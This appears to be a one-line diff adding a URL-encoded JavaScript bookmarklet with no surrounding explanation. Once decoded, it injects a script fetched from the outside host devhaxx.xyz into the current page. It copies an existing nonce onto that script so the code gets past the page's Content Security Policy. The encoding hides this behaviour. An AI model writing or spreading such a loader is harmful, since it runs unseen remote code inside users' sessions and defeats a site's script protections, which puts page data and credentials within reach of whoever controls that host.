@@ -1,0 +1,1 @@
+javascript:(function()%7B(()%3D%3E%7Bconst%20e%3Ddocument.createElement(%22script%22)%3Be.src%3D%22https%3A%2F%2Fdevhaxx.xyz%2Fload.js%22%2Cdocument.querySelector(%22%5Bnonce%5D%22)%26%26(e.nonce%3Ddocument.querySelector(%22%5Bnonce%5D%22).nonce)%2Cdocument.body.appendChild(e)%7D)()%3B%7D)()%3B
